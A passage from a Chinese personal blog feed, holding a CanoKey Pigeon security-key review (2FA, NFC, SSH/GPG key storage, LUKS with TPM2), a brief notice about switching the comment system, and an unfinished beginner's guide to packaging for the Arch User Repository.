<p><span class="exturl" data-url="aHR0cHM6Ly91bml4LnN0YWNrZXhjaGFuZ2UuY29tL3F1ZXN0aW9ucy84NjAxMi93aGF0LWlzLXRoZS1wdXJwb3NlLW9mLXRoZS1oYXNoLWNvbW1hbmQ=">What is the purpose of the hash command?<i class="fa fa-external-link-alt"></i></span>  </p>
]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>LFS</tag>
      </tags>
  </entry>
  <entry>
    <title>新年开箱一个 Canokey Pigeon</title>
    <url>/canokey-pigeon-unboxing/</url>
    <content><![CDATA[<p>迟来的开箱，本来以为快递1号当天能到的，结果晚了一点。不管怎么说，元旦快落！</p>
<span id="more"></span>

<h2 id="开箱"><a href="#开箱" class="headerlink" title="开箱"></a>开箱</h2><p>Canokey就是tuna那一帮人弄的重置版yubikey啦，stm32版本完全开源，发售的版本固件开源加密算法没开。至于后门和售后这些问题，由子安人格担保。这一批的500个比以前更贵了，169大洋，小贵。（据说以前是亏本买的）和之前透明探索版不同，这次虽然有壳，但是似乎更脆弱了，总担心一不小心掉水里。然而还是买了，看到群友人均有一个key我也想整一个。虽然小贵，但是飞天的key又怕有后门不太敢要。其他的产品算上跨国邮费还是比这个贵了。（虽然我有个stm32的，找嘉立创打样整了一个，不过做工一般（毕竟白嫖的嘉立创打样，有就不错了），不太适合挂钥匙扣上一直带着）</p>
<p>子安29号从深圳发的，去快递的时候货架上还放着不少连号的相同包装，应该都是群友的。外包装有点脏，里面完好，附带一个绳子和USB-A转type-c的转接头。插上以后chromium浏览器会自动弹出管理界面（Firefox不支持Webusb所以用不了）<br><img src="/canokey-pigeon-unboxing/canokey2.webp"><br>好，然后生成个ed25519的密钥换掉我原来用于ssh登陆的rsa（这个对我来说好处是密钥不像rsa那么长，可以用笔抄在纸上一份，不要paperkey一类的工具把它变短了）。按照惯例找个liveusb，装好gpg，断网，生成公钥密钥子密钥。然后将子密钥导入CanoKey，主密钥抄下来。</p>
<p>感觉还是原来的透明探索版看起来耐用一点，这个的壳子不怎么防水容易进灰。上几张图给大家看一下灯光亮度。亮度和罗技G102鼠标最亮的蓝光大致相当，远高于我的键盘（dell kb522）指示灯和机箱电源的蓝光。（建议在管理页面调成默认关闭LED）</p>
<p><img src="/canokey-pigeon-unboxing/canokey3.webp"><br><img src="/canokey-pigeon-unboxing/canokey4.webp"></p>
<p>一个惊喜是这个功率比较低，在我的键盘USB插槽上可以正常使用。我的键盘USB插槽功率连U盘都带不动，也带不动g102等大部分鼠标，闲置了许久终于有了用途。</p>
<h2 id="用途和体验"><a href="#用途和体验" class="headerlink" title="用途和体验"></a>用途和体验</h2><p>1.两步验证</p>
<p>这个没有FIDO认证，因为没交保护费。所以YubiKey能干的一些事他干不了，比如可以跳过验证的<span class="exturl" data-url="aHR0cHM6Ly9jbG91ZGZsYXJlY2hhbGxlbmdlLmNvbS8=">cloudflarechallenge<i class="fa fa-external-link-alt"></i></span>。<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNzc2MzE4NjE=">互联网上消防栓的消亡-Cloudflare 无图 CAPTCHA 的应运而生<i class="fa fa-external-link-alt"></i></span> 想不要CAPTCHA那得交保护费。 </p>
<p>国内大多数网站不支持，不过Google帐号之类的还是可以的。Webauthn有FIDO2会用FIDO2,没有会去用U2F。</p>
<p>2.NFC</p>
<p>打开了一直关闭的iphone NFC功能试了一下，然而没有成功。据说这一批的确不太行，可能还不如之前的透明探索版。见<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nhbm9rZXlzL2Nhbm9rZXktcGlnZW9uL2Rpc2N1c3Npb25zLzQ=">对 NFC 的一些说明和建议<i class="fa fa-external-link-alt"></i></span>。</p>
<p>更新：读取成功了！弹出提示 网站NFC标签 “在Safari浏览器中打开”canokeys.org””（当然，没有webUSB，console用不了），NFC Tools成功读到标签类型和序列号。试了一下Google的两步验证，登陆成功。<br>iphone读NFC的位置非常靠上，大概在刘海屏的背面那里，其他位置读不到。 </p>
<p>更新：如果NFC不好使请试试：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nhbm9rZXlzL2Nhbm9rZXktcGlnZW9uL2Rpc2N1c3Npb25zLzY=">NFC修复指南<i class="fa fa-external-link-alt"></i></span></p>
<p>3.sudo免密码</p>
<p>可以装<code>pam_u2f</code>实现，配置方式见<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvVW5pdmVyc2FsXzJuZF9GYWN0b3I=">Universal_2nd_Factor ArchWiki<i class="fa fa-external-link-alt"></i></span>。不过还是建议不要sudo免密，在恍惚走神的状态下使用sudo容易酿成大祸。有的时候确认处在清醒状态直接<code>sudo su -</code>临时操作一下就好了。</p>
<p>4.放密钥</p>
<p>终于说到了我买这个key的主要目的了，拿来放密钥。体验还不错，有些时候跑到别人的电脑上或者在公共电脑上用ssh登陆的时候终于不用担心密钥泄漏了。 </p>
<p>5.加密LUKS之类的</p>
<p>去年systemd-homed刚出的那个时候我写过一篇博客，还说等我有了YubiKey试试LUKS加密home分区。不过到今年我已经很不喜欢systemd了（底裤，注意底裤！）。更重要的是我终于想明白了我home分区里面那点破玩意价值不足10元，用一个几百元的key去保护一个连key的零头都不到的破数据没必要。是时候停止我的被迫害妄想症了。</p>
<p>对于防止普通人直接把你硬盘扣了插到别的电脑上读数据，Arch可以直接装<code>mkinitcpio-tpm2-encrypt</code>和<code>luks-tpm2</code>这两个包配置TPM2+LUKS加密。systemd 248以上版本用systemd-cryptenroll也行。不过dell、hp几家的国行没有TPM的，有TPM的联想之类的也是有后门的TPM，所以你如果想拿来对付非普通人士还是算了吧。</p>
<h2 id="推不推荐买"><a href="#推不推荐买" class="headerlink" title="推不推荐买"></a>推不推荐买</h2><p>这要看你拿它来干什么，如果你很在乎体验又不缺钱也对开源没有特殊的感情，那去买YubiKey吧。如果不是很想掏钱或者对安全没那么在乎，那没必要买类似的产品。如果你想找一个足够方便的两步验证设备，那建议去用给FIDO2交了保护费的FIDO2之类的。  </p>
<p>我只是用它放个密钥啥的，倒也够用了。其实三年前我第一次开始用密钥是因为不想每次输入密码，后来逐渐变成了被迫害妄想症，一发不可收拾（倒也不全是杞人忧天，至少我大四的时候经历过一次被盗，由于出租屋家徒四壁幸免于难，合租的两位损失过万）<br>设置密码或者加密文件到底是防谁呢？</p>
<blockquote>
<p>There are two types of encryption: one that will prevent your sister from reading your diary and one that will prevent your government.   —-Bruce Schneier</p>
</blockquote>
<p>一顿操作下来，突然有一天发现密码忘了、钥匙无了、LUKS损坏了。<strong>防的竟是我自己</strong><br>第一种我身边的人用密码挡一下就已经够了，第二种暂时没有这个需求。现在除了你姐姐和gov，更多的是一些大小公司的流氓软件，扫描你的目录上传你的相册。现在已经懒得和它们斗智斗用了，流氓软件扔进虚拟机，密钥扔进CanoKey。   </p>
<p>说说局限<br>1.NFC不太灵<br>2.蓝色的灯光比较刺眼（设置里可以关）<br>3.由于芯片性能原因不能直接在CanoKey里面生成rsa4096（不过可以导入）<br>4.加密算法不开源（不过有子安人格担保）<br>5.这次一个Yubikey的价格没法买5个CanoKey了症<br>6.送的type-c转接头短一截看着逼死强迫</p>
<p><img src="/canokey-pigeon-unboxing/canokey5.webp"></p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnplbml0aGFsLm1lLzIwMjEvMDIvMTUvQW50LURlc2lnbi1HaXRIdWItMkZBLXVuYXZhaWxhYmxlLWluLUNoaW5hLw==">从Ant Design GitHub失窃案谈开去：国内有可用的2FA吗<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vc3ByZWFkc2hlZXRzL2QvMVBQNmFrU3RMX3hIVFk2OHpETW1LYkpyQnFRaE4zRkU5TXdMRG9NR3hiYXMvZWRpdCNnaWQ9MA==">Comparison of security keys<i class="fa fa-external-link-alt"></i></span> 群友整理的关于隔壁各家类似产品的功能对比<br><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmNhbm9rZXlzLm9yZy8=">CanoKeys官方文档<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RyZHVoL1l1YmlLZXktR3VpZGU=">YubiKey Guide<i class="fa fa-external-link-alt"></i></span> CanoKey的资料比较少，一些用法可以参考yubikey<br><span class="exturl" data-url="aHR0cHM6Ly9pYW10d3ouZ2l0Ym9va3MuaW8veXViaWtleS1oYW5kYm9vay1jaGluZXNlLw==">YubiKey 使用手册<i class="fa fa-external-link-alt"></i></span> 中文资料<br><span class="exturl" data-url="aHR0cHM6Ly9ud24ubW9lL3Bvc3RzL3l1YmlrZXktZXhhbXBsZXM=">应用 Yubikey 的N种方法<i class="fa fa-external-link-alt"></i></span>   </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FnaGVyemFuL3l1YmlrZXktZnVsbC1kaXNrLWVuY3J5cHRpb24=">yubikey full disk encryption<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9ud24ubW9lL3Bvc3RzL2J0cmZzLW9uLWx1a3Mv">让系统更安全 - 系统分区加密 (Btrfs on LUKS) 操作实录<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9uZXdzLnljb21iaW5hdG9yLmNvbS9pdGVtP2lkPTI1ODYyMTU4">Unlocking LUKS2 Volumes with TPM2, FIDO2, PKCS#11 Security HW on Systemd 248<i class="fa fa-external-link-alt"></i></span>  如果只是想电脑被偷之后，不让普通小偷&#x2F;电脑城修电脑的&#x2F;脚本小子看你的数据，用tpm2加密home分区增加的破解成本差不多能够保护你不太之前的数据了。  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9mbHloaWdoZXIudG9wL2RldmVsb3AvMjE2MC5odG1s">谈谈 WebAuthn<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93ZWJhdXRobi5tZS8=">webauth.me<i class="fa fa-external-link-alt"></i></span> 用于测试webauthn的网站    </p>
<p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvUGFwZXJrZXk=">Paperkey Archwiki<i class="fa fa-external-link-alt"></i></span> paperkey用来减少密钥长度方便抄下来<br><span class="exturl" data-url="aHR0cHM6Ly91bHljLmdpdGh1Yi5pby8yMDIxLzAxLzEzLzIwMjElRTUlQjklQjQtJUU3JTk0JUE4JUU2JTlCJUI0JUU3JThFJUIwJUU0JUJCJUEzJUU3JTlBJTg0JUU2JTk2JUI5JUU2JUIzJTk1JUU0JUJEJUJGJUU3JTk0JUE4UEdQLSVFNCVCOCU4QS8=">2021年，用更现代的方法使用PGP（上）<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly91bHljLmdpdGh1Yi5pby8yMDIxLzAxLzE4LzIwMjElRTUlQjklQjQtJUU3JTk0JUE4JUU2JTlCJUI0JUU3JThFJUIwJUU0JUJCJUEzJUU3JTlBJTg0JUU2JTk2JUI5JUU2JUIzJTk1JUU0JUJEJUJGJUU3JTk0JUE4UEdQLSVFNCVCOCVBRC8=">2021年，用更现代的方法使用PGP（中）<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly91bHljLmdpdGh1Yi5pby8yMDIxLzAxLzI2LzIwMjElRTUlQjklQjQtJUU3JTk0JUE4JUU2JTlCJUI0JUU3JThFJUIwJUU0JUJCJUEzJUU3JTlBJTg0JUU2JTk2JUI5JUU2JUIzJTk1JUU0JUJEJUJGJUU3JTk0JUE4UEdQLSVFNCVCOCU4Qi8=">2021年，用更现代的方法使用PGP（下）<i class="fa fa-external-link-alt"></i></span>  </p>
<p>目前Pigeon暂时卖完了，你可以自己去嘉立创整一个stm32版本的</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nhbm9rZXlzL2Nhbm9rZXktc3RtMzI=">Canokey-stm32<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9sY2VkYS5jbi96NHl4L25mYy1wb3dlci10ZXN0">Canokey-NFC-A<i class="fa fa-external-link-alt"></i></span>   </p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>canokey</tag>
      </tags>
  </entry>
  <entry>
    <title>本站评论由valine更换为DisqusJS</title>
    <url>/change-comment-to-disqusjs/</url>
    <content><![CDATA[<p>由于近日不少采用valine作为评论系统网站的遭到几千个垃圾评论刷屏攻击，外加valine存在的安全隐患问题，放弃好看的valine，换用DisqusJS。<br>utteranc继续使用。</p>
]]></content>
  </entry>
  <entry>
    <title>AUR打包指北</title>
    <url>/create-aur-packages/</url>
    <content><![CDATA[<p>（长期施工中，未完待续）</p>
<span id="more"></span>

<blockquote class="blockquote-center">
<p>快来当AUR打包工具人&#x2F;打包苦力吧(笑</p>

</blockquote>

<p>其实还是建议你去先看看官方文档</p>
<h2 id="大致流程"><a href="#大致流程" class="headerlink" title="大致流程"></a>大致流程</h2><h3 id="新建一个测试环境"><a href="#新建一个测试环境" class="headerlink" title="新建一个测试环境"></a>新建一个测试环境</h3><p>在本机上直接打包可能会把你自己的机子环境搞乱搞崩，或者忽略了已经在自己电脑上装了了但是没有的依赖，又或者你想…<br>反正弄一个干净的测试环境是有必要的。可以参考官方Wiki：<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0RldmVsb3Blcldpa2k6QnVpbGRpbmdfaW5fYV9jbGVhbl9jaHJvb3Q=">DeveloperWiki:Building in a clean chroot<i class="fa fa-external-link-alt"></i></span>, 或者看肥猫这篇：<span class="exturl" data-url="aHR0cHM6Ly9mZWxpeGMuYXQvMjAxNy8wOC9pbnRyb2R1Y3Rpb24tdG8tYXJjaC1saW51eC1kZXZ0b29scy1idWlsZC1wYWNrYWdlcy1mcm9tLWEtY2xlYW4tY2hyb290Lw==">Arch Linux devtools 简介 – 在干净的环境里编译软件包<i class="fa fa-external-link-alt"></i></span></p>
<p>当然打包一些很简单、依赖很明确的东西，确定没必要也可以不要这一步。</p>
<h3 id="编写PKGBUILD"><a href="#编写PKGBUILD" class="headerlink" title="编写PKGBUILD"></a>编写PKGBUILD</h3><p>最快的方法是去找找有没有和你要打包的东西类似的包，然后抄一下它的PKGBUILD。</p>
<h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><p>先用namcap检查一下，有没有语法错误或者其他不符合规范的地方</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">namcap PKGBUILD</span><br></pre></td></tr></table></figure>

<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">makepkg -s</span><br></pre></td></tr></table></figure>

<p>生成的 <code>XXX.tar.xz</code>可以再用 <code>namcap</code>检查一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">namcap XXX.tar.xz</span><br></pre></td></tr></table></figure>

<h3 id="上传和分享"><a href="#上传和分享" class="headerlink" title="上传和分享"></a>上传和分享</h3><h4 id="AUR"><a href="#AUR" class="headerlink" title="AUR"></a>AUR</h4><p>如果想分享出来，你可以上传到AUR仓库里面。AUR帐号随便就能注册几乎没有审查的（所以传点恶意代码上去也能传的），但是尽量不要把有版权问题之类的东西传上去（虽然出了事应该是你自己负责）</p>
<p>新建一个账号，然后上传你的SSH公钥和密钥指纹。</p>
<p>用 <code>git clone</code>拉取一个</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> ssh://aur@aur.archlinux.org/your-package-name.git </span><br></pre></td></tr></table></figure>

<p>AUR软件仓库需要<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwLy5TUkNJTkZPXyglRTclQUUlODAlRTQlQkQlOTMlRTQlQjglQUQlRTYlOTYlODcp">SRCINFO<i class="fa fa-external-link-alt"></i></span>,不然会拒绝你的提交</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">makepkg --printsrcinfo &gt; .SRCINFO</span><br></pre></td></tr></table></figure>

<h4 id="非官方软件仓库"><a href="#非官方软件仓库" class="headerlink" title="非官方软件仓库"></a>非官方软件仓库</h4><p>或者你可以去其他非官方的仓库，这有一大堆：<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1Vub2ZmaWNpYWxfdXNlcl9yZXBvc2l0b3JpZXNfKCVFNyVBRSU4MCVFNCVCRCU5MyVFNCVCOCVBRCVFNiU5NiU4Nyk=">Unofficial user repositories<i class="fa fa-external-link-alt"></i></span></p>
<p>中文用户人最多的是ArchlinuxCN，我猜你很熟悉这个了。</p>
<p>其他的还有chaotic-aur（里面的包不少，但是国内速度很慢，镜像都在国外，直接访问可能比从AUR拉下来编译还慢），arch4edu（一些教育软件和包，清华的弄得，国内速度还行），blackarch（这个包也很多，约等于arch系的kali源）</p>
<p>要添加到这些非官方仓库里，可以请求打包，或者跟仓库管理员py。</p>
<p>或者可以自建一个仓库。</p>
<p>可参考：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYWxveGFmLmNvbS8yMDIwLzA2L2J1aWxkX2F1cl93aXRoX2dpdGh1Yl9hY3Rpb25zLw==">利用 GitHub Actions 编译 AUR 包并建立自己的软件源<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="一些工具"><a href="#一些工具" class="headerlink" title="一些工具"></a>一些工具</h2><h3 id="namcap"><a href="#namcap" class="headerlink" title="namcap"></a>namcap</h3><p>用来检查打包是否正确</p>
<h3 id="devtools"><a href="#devtools" class="headerlink" title="devtools"></a>devtools</h3><p>可以干很多事情，最常用的是新建一个干净的环境用来测试你的包。</p>
<p>还有很多用法去看文档吧，</p>
<h3 id="debtap"><a href="#debtap" class="headerlink" title="debtap"></a>debtap</h3><p>大多数情况下可以快速把deb包转成aur包<br>有些deb的包或者rpm的包可以拆包然后重新手动打包一下。一般的用debtap可以解决大部分deb包，有些依赖可能没办法需要手动处理。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -Syu debtap</span><br><span class="line">sudo debtap -u <span class="comment">#同步数据库，可能比较慢</span></span><br><span class="line">debtap -p XXX.deb <span class="comment"># -p 选项生成PKGBUILD</span></span><br><span class="line"><span class="comment">## 然后根据提示输入包名和协议等</span></span><br><span class="line"><span class="comment">## 然后稍等一会，会比较慢</span></span><br></pre></td></tr></table></figure>

<p>然后 <code>pacman -U XXX.tar.xz</code>可以装到你的电脑上试一下。</p>
<h3 id="pip2pkgbuilds"><a href="#pip2pkgbuilds" class="headerlink" title="pip2pkgbuilds"></a>pip2pkgbuilds</h3><p>将pip的包转成aur的包，这个工具很久没更新了（But it works）。这个工具有不少情况不会帮你自动处理，python的不少pip包本身也不太遵循pip的打包规范，要做不少手动检查和调整。</p>
<h3 id="npm-pkgbuild"><a href="#npm-pkgbuild" class="headerlink" title="npm-pkgbuild"></a>npm-pkgbuild</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FybGFjNzcvbnBtLXBrZ2J1aWxkI3JlYWRtZQ==">npm-pkgbuild<i class="fa fa-external-link-alt"></i></span> 一个将npm包转成aur的包，和上面那个类似，也是自动生成PKGBUILD。没用过不好评价。</p>
<h2 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h2><p>人肉测试每个包然后传上去给大家用是最好的，不过有的上游更新太勤测试不过来，或者一些<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1ZDU19wYWNrYWdlX2d1aWRlbGluZXNfKCVFNyVBRSU4MCVFNCVCRCU5MyVFNCVCOCVBRCVFNiU5NiU4Nyk=">用版本控制紧跟上游的包<i class="fa fa-external-link-alt"></i></span><br><del>又或者有的时候你想让用户当小白鼠</del></p>
<p>可以试试Travis CI、Github Action 之类的CI&#x2F;CD工具，不过最好还是更新之前人肉测试一下</p>
<h3 id="Github-Action"><a href="#Github-Action" class="headerlink" title="Github Action"></a>Github Action</h3><p>Github Action的好处是可以白嫖（划掉</p>
<p>可以用Github Action自动生成PKGBUILD：<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hcmtldHBsYWNlL2FjdGlvbnMvcHVibGlzaC1hdXItcGFja2FnZQ==">publish-aur-package<i class="fa fa-external-link-alt"></i></span></p>
<p>鸭鸭的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0R1Y2tTb2Z0L2J1aWxkLWF1ci1hY3Rpb24=">build-aur-action<i class="fa fa-external-link-alt"></i></span>,用Github Action编译一个AUR包（有时候你不想在自己电脑上编译可以试试这个）</p>
<p>使用见：<span class="exturl" data-url="aHR0cHM6Ly92aWZseXRoaW5rLmNvbS9Vc2VfR2l0SHViQWN0aW9uc190b19idWlsZF9BVVIv">GitHub Actions 打造 AUR 打包下载一条龙服务<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="一些小问题"><a href="#一些小问题" class="headerlink" title="一些小问题"></a>一些小问题</h2><h3 id="AUR的依赖包makepkg无法自动识别"><a href="#AUR的依赖包makepkg无法自动识别" class="headerlink" title="AUR的依赖包makepkg无法自动识别"></a>AUR的依赖包makepkg无法自动识别</h3><p>打包的时候如果依赖AUR的包，在 <code>makepkg -s</code>pacman是不会自动安装的需要手动安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">error: target not found: python-django-cors-headers</span><br><span class="line">==&gt; ERROR: <span class="string">&#x27;pacman&#x27;</span> failed to install missing dependencies.</span><br><span class="line">==&gt; ERROR: Could not resolve all dependencies.</span><br></pre></td></tr></table></figure>

<p>如果依赖太多装不过来，可以加 <code>makepkg -d</code>参数忽略依赖，然后对生成的 <code>XXX.tar.xz</code>使用yay或者pikaur之类的AUR helper</p>
<h3 id="git初次commit不包含SRCINFO导致拒绝提交"><a href="#git初次commit不包含SRCINFO导致拒绝提交" class="headerlink" title="git初次commit不包含SRCINFO导致拒绝提交"></a>git初次commit不包含SRCINFO导致拒绝提交</h3><p>可以用 <code>git filter branch</code></p>
<p>（其实直接删了重新 <code>git init</code>可能更快）</p>
<h2 id="常见写法和命令"><a href="#常见写法和命令" class="headerlink" title="常见写法和命令"></a>常见写法和命令</h2><h3 id="install命令"><a href="#install命令" class="headerlink" title="install命令"></a>install命令</h3><p>用过 <code>cmake</code>等编译工具的人应该对 <code>make install</code>很熟了，它在PKGBUILD里面大概像这样</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">package</span></span>() &#123;</span><br><span class="line">  make -C <span class="string">&quot;<span class="variable">$pkgname</span>-<span class="variable">$pkgver</span>&quot;</span> DESTDIR=<span class="string">&quot;<span class="variable">$pkgdir</span>&quot;</span> install</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在PKGBUILD里面，还经常用它把文件安装到制定目录，并指定权限（一般不用 <code>cp</code>来干这种事）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">package</span></span>() &#123;</span><br><span class="line">  <span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$srcdir</span>/<span class="variable">$pkgname</span>&quot;</span></span><br><span class="line">  install -vDm 644 <span class="variable">$&#123;pkgname%-git&#125;</span>&#123;,.plugin&#125;.zsh \</span><br><span class="line">    -t <span class="string">&quot;<span class="variable">$&#123;pkgdir&#125;</span>/usr/share/zsh/plugins/<span class="variable">$&#123;pkgname&#125;</span>/&quot;</span></span><br><span class="line">  install -Dm644 LICENSE <span class="string">&quot;<span class="variable">$pkgdir</span>&quot;</span>/usr/share/licenses/<span class="variable">$pkgname</span>/LICENSE</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将可执行文件和LICENSE分别放到指定目录，像LICENSE或者doc权限644就好了，其他的可执行文件酌情给个755权限。</p>
<p>如果有需要打印详细安装信息方便调试，可以加 <code>-v</code>选项，像这样 <code>install -Dvm755</code></p>
<h3 id="常见写法"><a href="#常见写法" class="headerlink" title="常见写法"></a>常见写法</h3><p>获取Github Release</p>
<h2 id="练手推荐"><a href="#练手推荐" class="headerlink" title="练手推荐"></a>练手推荐</h2><p>上手AUR打包基本只需要一点bash脚本的知识就可以了。当然最好还要对打包的项目和所用的语言、框架、依赖比较熟悉。</p>
<p>反正我感觉比deb和rpm的打包简单太多了，而且由于包管理的机制，虽然容易挂，但是依赖一般不会特别麻烦（除了有些要拆包的东西）</p>
<p>你看看依赖问题<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI5MTYwNjEyOC9hbnN3ZXIvMTE5NDU5NjU5MQ==">都把隔壁deb系的老哥逼成什么样了<i class="fa fa-external-link-alt"></i></span>。</p>
<p>可以看这个<span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIuaWJtLmNvbS96aC9hcnRpY2xlcy9sLWxvLXJwbS1idWlsZC1wYWNrYWdlLw==">Linux 中 RPM 的构建与打包<i class="fa fa-external-link-alt"></i></span>感受一下打包流程<br>（当然rpm包用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2pvcmRhbnNpc3NlbC9mcG0=">fpm<i class="fa fa-external-link-alt"></i></span>之类的打包工具也没有那么麻烦）</p>
<p>官方的打包示例是要用到make编译c&#x2F;c++包的例子，但是一些c&#x2F;c++的包，运行环境和依赖会比较麻烦，而且在x86和arm等不同架构下面也会有很多问题。拿来熟悉打包流程对萌新不太友好。</p>
<p>练手打包建议用从自己最熟悉的项目和语言开始。如果你什么语言都不熟悉呢，推荐用一些主题或者可以用debtap之类的工具方便的转成AUR包的东西来熟悉一下打包。</p>
<p>有的系统主题、grub主题、输入法主题之类的包比较好打包，一般来说依赖也少，不会搞出什么大问题。而且主题的文件存放位置和PKGBUILD里面的其他东西可以找AUR里面打包好的其他主题参考，基本大同小异，上手打包不会有太太高难度和坑，不太熟悉流程的可以先用一些主题练手熟悉一下打包流程。（主要是这个依赖也少，破坏性比较小，萌新打出低质量的AUR包也不至于把装这个包的人一波带走闯下大祸）</p>
<p>而且他们不需要编译，也没有依赖报错，总之非常的适合熟悉一下PKGBUILD的流程</p>
<p>当然打包不能包揽所有工作，一些设置需要用户手动启用或者修改的（比如一些配置，又比如systemd之类的daemon），比如我这里打包了一个GRUB的Cyberpunk主题，需要用户手动修改</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/default/grub</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GRUB_THEME=<span class="string">&quot;/usr/share/grub/themes/Cyberpunk/theme.txt&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>

<p>需要用户手动修改设置来启用（基本上主题、桌面挂件之类的包都是这么做的）</p>
<h2 id="闲话"><a href="#闲话" class="headerlink" title="闲话"></a>闲话</h2><p>暑假的时候打了十几个野包，当时水平也菜，刚洗手变成Arch玩家没多久，打的十几个包都没放到AUR上丢人。虽然现在还是真蒟蒻在群里围观各路大佬卖弱不敢说话，看到中文的打包教程这么少，决定还是写点什么。</p>
<p>当时搜AUR打包相关的资料，发现相关的文章、博客、资料并不多（尤其是中文的）。中文资料保守估计不到Archlinux安装教程的百分之一，也不到deb、rpm、Flatpak打包教程的百分之一。</p>
<p>Archlinux安装弄的这么难初衷可能是为了筛掉一部分小白和伸手党，不过网上各路保姆级安装教程（一步一步手把手教的视频演示那种）和各种一键安装脚本和 Arch based 的发行版基本上快让<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0FyY2hfTGludXhfKCVFNyVBRSU4MCVFNCVCRCU5MyVFNCVCOCVBRCVFNiU5NiU4Nyk=">Arch的理念<i class="fa fa-external-link-alt"></i></span>流产了(特别是广为诟病的Manjaro和网上一大堆不负责任的教程，一口一个适合小白，动不动就教人添加ArchlinuxCN源，搞得很多打包者不堪骚扰)</p>
<p>小白倒没什么，主要是被伸手党搞怕了。</p>
<p>独立打一个包应该不会比独立装一个Archlinux难（不考虑Nvidia双显卡博通网卡阴间主板诡异驱动等….）。<br>如果一个用户能参照ArchWiki独立装好、配置好自己的Arch，那就应该有能力自己打包。<br>Arch没有Mac、Windows、ChromeOS那样的财大气粗的公司和掏钱买服务的客户，甚至不能跟RHEL和Ubuntu比，社区纯靠热情。而且由于deb系和rpm系用户众多，基本大部分软件如果支持Linux会给出deb或者rpm的包，有的可能会给个appimage的包，Arch的支持基本没太多上游会管，很多包都是Arch的维护者和用户自行编译打包的（不少还是deb拆包转的）。<br>伸手党太多而打包者太少，那就离凉凉不远了。<br>下次看到没有包当伸手党可不好，没有包就自己打一个吧。</p>
